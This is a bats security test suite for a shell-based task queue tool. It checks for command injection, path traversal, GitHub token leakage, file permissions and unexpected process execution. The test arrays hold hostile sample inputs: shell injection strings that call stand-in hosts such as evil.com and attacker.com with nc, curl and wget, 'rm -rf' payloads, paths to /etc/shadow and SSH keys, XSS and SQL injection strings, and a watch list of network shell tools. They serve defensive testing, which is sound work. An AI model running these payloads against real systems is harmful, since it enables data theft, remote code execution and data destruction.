#!/usr/bin/env bats
# Security testing for task queue system
#
# This comprehensive security test suite validates:
# - Input validation and sanitization
# - Command injection prevention
# - GitHub token handling security
# - File system security and permissions
# - Path traversal protection
# - Authentication and authorization
# - Data handling security
# - Access control validation
#
# Security Requirements:
# - All user inputs must be validated and sanitized
# - GitHub tokens must never be logged or exposed
# - File operations must prevent path traversal
# - Proper file permissions on sensitive data
# - Authentication tokens must be validated
# - No command injection vulnerabilities

load '../test_helper'

setup() {
    # Load test environment
    load_test_environment
    
    # Set up security test configuration
    export SECURITY_AUDIT=true
    export LOG_LEVEL="DEBUG"  # Enable debug logging for security testing
    
    # Create isolated security test environment
    SECURITY_TEST_DIR="/tmp/security_test_$$"
    export TASK_QUEUE_DIR="$SECURITY_TEST_DIR"
    mkdir -p "$SECURITY_TEST_DIR"
    
    # Set up test configuration
    cat > "$SECURITY_TEST_DIR/security.conf" << 'EOF'
TASK_QUEUE_ENABLED=true
SECURITY_AUDIT=true
INPUT_VALIDATION=true
GITHUB_AUTO_COMMENT=false
LOG_LEVEL=DEBUG
EOF
    export CONFIG_FILE="$SECURITY_TEST_DIR/security.conf"
}

teardown() {
    # Clean up security test environment
    if [[ -n "$SECURITY_TEST_DIR" && -d "$SECURITY_TEST_DIR" ]]; then
        rm -rf "$SECURITY_TEST_DIR"
    fi
    
    # Clean up any test files
    cleanup_security_test_environment
}

setup_security_test_environment() {
    # Ensure clean state for security testing
    cleanup_security_test_environment
    mkdir -p "$SECURITY_TEST_DIR"
}

cleanup_security_test_environment() {
    # Clean up after security tests
    if [[ -n "$SECURITY_TEST_DIR" && -d "$SECURITY_TEST_DIR" ]]; then
        rm -rf "$SECURITY_TEST_DIR"
    fi
    
    # Remove any temporary test files
    rm -f /tmp/security_test_* 2>/dev/null || true
}

verify_input_safely_escaped() {
    local input="$1"
    
    # Check that the input was safely stored in the queue file
    local queue_file="$SECURITY_TEST_DIR/task-queue.json"
    if [[ -f "$queue_file" ]]; then
        # The input should be properly escaped in JSON
        ! grep -F "$input" "$queue_file" || {
            # If found, it should be properly JSON-escaped
            jq -e '.tasks[] | select(.description | contains($input))' --arg input "$input" "$queue_file" >/dev/null
        }
    fi
}

test_command_injection() {
    local malicious_input="$1"
    local expected_behavior="${2:-reject}"  # "reject" or "escape"
    
    # Try to add task with malicious input
    if "$PROJECT_ROOT/src/hybrid-monitor.sh" --add-custom "$malicious_input" --quiet 2>/dev/null; then
        if [[ "$expected_behavior" == "escape" ]]; then
            # If accepted, verify it's safely escaped
            verify_input_safely_escaped "$malicious_input"
        else
            # If we expected rejection, this is a security issue
            log_error "Malicious input was accepted when it should have been rejected: $malicious_input"
            return 1
        fi
    else
        # Input was rejected, which is good for security
        return 0
    fi
}

@test "input validation: command injection prevention" {
    # Test various command injection attempts
    
    setup_security_test_environment
    
    local malicious_inputs=(
        "'; rm -rf /tmp; echo 'pwned"
        "\$(whoami)"
        "; cat /etc/passwd"
        "| nc attacker.com 1234"
        "\`id\`"
        "../../../etc/passwd"
        "\$(curl http://evil.com/steal-data)"
        "; wget http://evil.com/malware.sh && bash malware.sh"
        "' && rm -rf . && echo '"
        "\n; /bin/bash -c 'curl evil.com' #"
    )
    
    local failed_tests=0
    
    for input in "${malicious_inputs[@]}"; do
        log_debug "Testing command injection with: $input"
        
        if ! test_command_injection "$input" "reject"; then
            ((failed_tests++))
            log_error "Command injection test failed for: $input"
        fi
    done
    
    # All command injection attempts should be safely handled
    [[ $failed_tests -eq 0 ]] || {
        log_error "$failed_tests command injection tests failed"
        return 1
    }
    
    cleanup_security_test_environment
}

@test "github token handling: no token leakage in logs" {
    # Verify GitHub tokens are never logged or exposed
    
    setup_security_test_environment
    
    # Set up fake GitHub token for testing
    local fake_token="ghp_1234567890abcdef1234567890abcdef12345678"
    export GITHUB_TOKEN="$fake_token"
    
    # Perform operations that might log the token
    "$PROJECT_ROOT/src/hybrid-monitor.sh" --add-custom "Test GitHub token handling" --quiet 2>&1 | tee "$SECURITY_TEST_DIR/test_output.log" || true
    
    # Check various log locations for token leakage
    local log_files=(
        "$SECURITY_TEST_DIR/test_output.log"
        "logs/hybrid-monitor.log"
        "logs/github-integration.log"
        "$SECURITY_TEST_DIR/security.log"
    )
    
    local token_found=false
    for log_file in "${log_files[@]}"; do
        if [[ -f "$log_file" ]]; then
            if grep -q "$fake_token" "$log_file" 2>/dev/null; then
                log_error "GitHub token found in log file: $log_file"
                token_found=true
            fi
            
            # Also check for common token patterns
            if grep -i -E "(ghp_|github.*token)" "$log_file" 2>/dev/null | grep -v "REDACTED\|MASKED\|\*\*\*"; then
                log_warn "Potential token-related information in log: $log_file"
            fi
        fi
    done
    
    # Check queue backup files for token leakage
    if [[ -d "$SECURITY_TEST_DIR/backups" ]]; then
        if grep -r "$fake_token" "$SECURITY_TEST_DIR/backups/" 2>/dev/null; then
            log_error "GitHub token found in backup files"
            token_found=true
        fi
    fi
    
    # Token should not be found in any logs
    [[ "$token_found" == "false" ]]
    
    # Clean up
    unset GITHUB_TOKEN
    cleanup_security_test_environment
}

@test "file system security: prevent path traversal" {
    # Test path traversal prevention
    
    setup_security_test_environment
    
    local malicious_paths=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\cmd.exe"
        "/etc/shadow"
        "~/../../root/.ssh/id_rsa"
        "../../../../../proc/self/environ"
        "....//....//....//etc/passwd"
        "/dev/null; cat /etc/passwd #"
    )
    
    local failed_tests=0
    
    for path in "${malicious_paths[@]}"; do
        log_debug "Testing path traversal with: $path"
        
        # Test various operations with malicious paths
        local test_operations=(
            "--custom-queue-dir '$path'"
            "--backup-to-file '$path'"
            "--restore-from-backup '$path'"
        )
        
        for operation in "${test_operations[@]}"; do
            if eval "$PROJECT_ROOT/src/hybrid-monitor.sh $operation" 2>/dev/null; then
                # Check if the operation actually accessed the malicious path
                if [[ -f "$path" && "$path" =~ \.\./|^/etc/ ]]; then
                    log_error "Path traversal succeeded with: $path"
                    ((failed_tests++))
                    break
                fi
            fi
        done
    done
    
    # All path traversal attempts should be prevented
    [[ $failed_tests -eq 0 ]] || {
        log_error "$failed_tests path traversal tests failed"
        return 1
    }
    
    cleanup_security_test_environment
}

@test "access control: proper file permissions" {
    # Verify proper file permissions on sensitive files
    
    setup_security_test_environment
    
    # Create queue with tasks to generate files
    "$PROJECT_ROOT/src/hybrid-monitor.sh" --add-custom "Permission test task" --quiet >/dev/null 2>&1
    
    # List of files/directories that should have secure permissions
    local secure_files=(
        "$SECURITY_TEST_DIR/task-queue.json"
        "$SECURITY_TEST_DIR/queue-state.json"
        "$SECURITY_TEST_DIR/backups"
    )
    
    local permission_errors=0
    
    for file_path in "${secure_files[@]}"; do
        if [[ -f "$file_path" || -d "$file_path" ]]; then
            # Get file permissions (works on both macOS and Linux)
            local permissions
            permissions=$(stat -c "%a" "$file_path" 2>/dev/null || stat -f "%A" "$file_path" 2>/dev/null || echo "000")
            
            log_debug "Checking permissions for $file_path: $permissions"
            
            # Convert permissions to numeric for easier checking
            local numeric_perms
            if [[ "$permissions" =~ ^[0-9]+$ ]]; then
                numeric_perms="$permissions"
            else
                # Convert symbolic permissions to numeric (basic conversion)
                numeric_perms="644"  # Default assumption
            fi
            
            # Check for world-writable permissions (dangerous)
            if [[ "$numeric_perms" =~ [2367]$ ]]; then
                log_error "World-writable permissions on sensitive file: $file_path ($permissions)"
                ((permission_errors++))
            fi
            
            # Check for world-readable permissions on queue files (may contain sensitive data)
            if [[ "$file_path" =~ queue.*\.json$ ]] && [[ "$numeric_perms" =~ .[4567] ]]; then
                log_warn "World-readable permissions on queue file: $file_path ($permissions)"
                # Don't fail for this, just warn
            fi
        fi
    done
    
    # Should not have any critical permission errors
    [[ $permission_errors -eq 0 ]] || {
        log_error "$permission_errors file permission security issues found"
        return 1
    }
    
    cleanup_security_test_environment
}

@test "input sanitization: special characters and encoding" {
    # Test handling of special characters and encoding
    
    setup_security_test_environment
    
    local special_inputs=(
        "<script>alert('xss')</script>"
        "'; DROP TABLE tasks; --"
        "payload\x00null\x00byte"
        $'\n\r\t\v\f'  # Control characters
        "$(printf '\x80\x81\x82\x83')"  # High-bit characters
        "ñiñé中文🚀"  # Unicode characters
    )
    
    local sanitization_errors=0
    
    for input in "${special_inputs[@]}"; do
        log_debug "Testing input sanitization with special characters"
        
        if "$PROJECT_ROOT/src/hybrid-monitor.sh" --add-custom "$input" --quiet >/dev/null 2>&1; then
            # If accepted, verify it's safely stored
            local queue_file="$SECURITY_TEST_DIR/task-queue.json"
            if [[ -f "$queue_file" ]]; then
                # Verify the file is still valid JSON after adding special characters
                if ! jq '.' "$queue_file" >/dev/null 2>&1; then
                    log_error "Special character input broke JSON structure: $input"
                    ((sanitization_errors++))
                fi
                
                # Check for proper escaping of dangerous characters
                if grep -q "<script>" "$queue_file" 2>/dev/null; then
                    log_warn "HTML/JavaScript not properly escaped in queue file"
                fi
            fi
        fi
    done
    
    # Should handle all special characters without breaking
    [[ $sanitization_errors -eq 0 ]] || {
        log_error "$sanitization_errors input sanitization errors found"
        return 1
    }
    
    cleanup_security_test_environment
}

@test "authentication validation: github token format" {
    # Test GitHub token format validation
    
    setup_security_test_environment
    
    local invalid_tokens=(
        "invalid-token"
        "ghp_short"
        "not-a-token-at-all"
        ""
        "ghp_" # Too short
        "fake_ghp_1234567890abcdef1234567890abcdef12345678"
    )
    
    for token in "${invalid_tokens[@]}"; do
        log_debug "Testing invalid GitHub token: ${token:0:10}..."
        
        export GITHUB_TOKEN="$token"
        
        # GitHub operations should handle invalid tokens gracefully
        if "$PROJECT_ROOT/src/hybrid-monitor.sh" --add-custom "Token validation test" --quiet 2>/dev/null; then
            # If the operation succeeded, verify it didn't actually use the invalid token
            local log_files=("$SECURITY_TEST_DIR"/*.log logs/*.log)
            local token_used=false
            
            for log_file in "${log_files[@]}"; do
                if [[ -f "$log_file" ]] && grep -q "authentication.*failed\|invalid.*token" "$log_file" 2>/dev/null; then
                    token_used=true
                    break
                fi
            done
            
            # Should have detected and handled the invalid token
            if [[ "$token_used" == "false" ]] && [[ -n "$token" ]]; then
                log_warn "Invalid token may not have been properly validated: ${token:0:10}..."
            fi
        fi
    done
    
    # Clean up
    unset GITHUB_TOKEN
    cleanup_security_test_environment
}

@test "data exposure prevention: sensitive information in output" {
    # Verify sensitive information is not exposed in outputs
    
    setup_security_test_environment
    
    # Set up test environment with sensitive information
    export TEST_SENSITIVE_VAR="super-secret-password"
    export GITHUB_TOKEN="ghp_test_token_1234567890abcdef"
    
    # Run various operations and capture output
    local output_file="$SECURITY_TEST_DIR/output_test.log"
    
    {
        "$PROJECT_ROOT/src/hybrid-monitor.sh" --add-custom "Data exposure test" --verbose
        "$PROJECT_ROOT/src/hybrid-monitor.sh" --list-queue --verbose
        "$PROJECT_ROOT/src/hybrid-monitor.sh" --system-status --verbose || true
        "$PROJECT_ROOT/src/hybrid-monitor.sh" --check-health --verbose || true
    } 2>&1 | tee "$output_file"
    
    # Check for sensitive data in output
    local exposure_found=false
    
    if grep -q "$TEST_SENSITIVE_VAR" "$output_file" 2>/dev/null; then
        log_error "Sensitive environment variable exposed in output"
        exposure_found=true
    fi
    
    if grep -q "ghp_test_token" "$output_file" 2>/dev/null; then
        log_error "GitHub token exposed in output"
        exposure_found=true
    fi
    
    # Check for common patterns that might expose sensitive data
    local sensitive_patterns=(
        "password"
        "secret"
        "key.*="
        "token.*="
    )
    
    for pattern in "${sensitive_patterns[@]}"; do
        if grep -i -E "$pattern" "$output_file" | grep -v "REDACTED\|\*\*\*\|<hidden>" 2>/dev/null; then
            log_warn "Potentially sensitive information pattern found: $pattern"
        fi
    done
    
    # Should not expose sensitive information
    [[ "$exposure_found" == "false" ]]
    
    # Clean up
    unset TEST_SENSITIVE_VAR GITHUB_TOKEN
    cleanup_security_test_environment
}

@test "process isolation: no unintended process execution" {
    # Verify no unintended processes are executed
    
    setup_security_test_environment
    
    # Monitor process execution during operations
    local process_log="$SECURITY_TEST_DIR/process_monitor.log"
    
    # Get initial process list
    ps aux > "$process_log.before"
    
    # Perform operations
    "$PROJECT_ROOT/src/hybrid-monitor.sh" --add-custom "Process isolation test" --quiet >/dev/null 2>&1
    
    # Get final process list
    ps aux > "$process_log.after"
    
    # Look for suspicious new processes (this is basic - more sophisticated monitoring could be added)
    local suspicious_processes=(
        "nc"
        "netcat"
        "curl.*http"
        "wget.*http"
        "bash.*-c"
        "sh.*-c"
    )
    
    local suspicious_found=false
    for process in "${suspicious_processes[@]}"; do
        if diff "$process_log.before" "$process_log.after" | grep -E ">\s.*$process" 2>/dev/null; then
            log_warn "Suspicious process execution detected: $process"
            suspicious_found=true
        fi
    done
    
    # In a production test, we might want to be more strict about this
    # For now, just warn about suspicious processes
    if [[ "$suspicious_found" == "true" ]]; then
        log_warn "Suspicious process execution detected - review process monitoring"
    fi
    
    cleanup_security_test_environment
}

@test "configuration security: secure defaults" {
    # Verify secure default configurations
    
    setup_security_test_environment
    
    # Test with default configuration
    local config_file="$SECURITY_TEST_DIR/default_test.conf"
    cat > "$config_file" << 'EOF'
# Minimal configuration for security testing
TASK_QUEUE_ENABLED=true
EOF
    
    export CONFIG_FILE="$config_file"
    
    # Check that security-sensitive options have secure defaults
    local security_checks=(
        "INPUT_VALIDATION should default to enabled"
        "DEBUG_MODE should default to disabled" 
        "VERBOSE_LOGGING should not expose sensitive data"
        "EXTERNAL_COMMANDS should be restricted"
    )
    
    # Run system with minimal config
    "$PROJECT_ROOT/src/hybrid-monitor.sh" --add-custom "Security default test" --quiet >/dev/null 2>&1
    
    # Verify secure behavior with defaults
    local queue_file="$SECURITY_TEST_DIR/task-queue.json"
    if [[ -f "$queue_file" ]]; then
        # Queue should be created with appropriate structure
        jq '.' "$queue_file" >/dev/null 2>&1 || {
            log_error "Queue file not properly structured with default config"
            return 1
        }
    fi
    
    # Check log files for any security warnings
    local log_files=("$SECURITY_TEST_DIR"/*.log logs/*.log)
    for log_file in "${log_files[@]}"; do
        if [[ -f "$log_file" ]] && grep -i "security.*warning\|insecure.*configuration" "$log_file" 2>/dev/null; then
            log_warn "Security warnings found in logs with default configuration"
        fi
    done
    
    cleanup_security_test_environment
}